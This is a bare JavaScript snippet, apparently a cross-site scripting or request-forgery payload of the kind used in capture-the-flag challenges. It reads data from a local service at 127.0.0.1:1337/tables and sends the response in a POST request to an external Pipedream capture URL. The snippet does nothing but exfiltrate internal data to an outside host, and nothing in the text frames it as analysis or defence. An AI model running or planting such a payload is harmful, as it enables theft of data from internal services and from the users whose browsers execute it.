fetch('http://127.0.0.1:1337/tables')
  .then(response => response.text())
  .then(data => {
    fetch('https://eoi9s074jcny7f1.m.pipedream.net', {
      method: 'POST',
      body: 'data=' + encodeURIComponent(data),
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
    });
  })
  .catch(err => console.error(err));
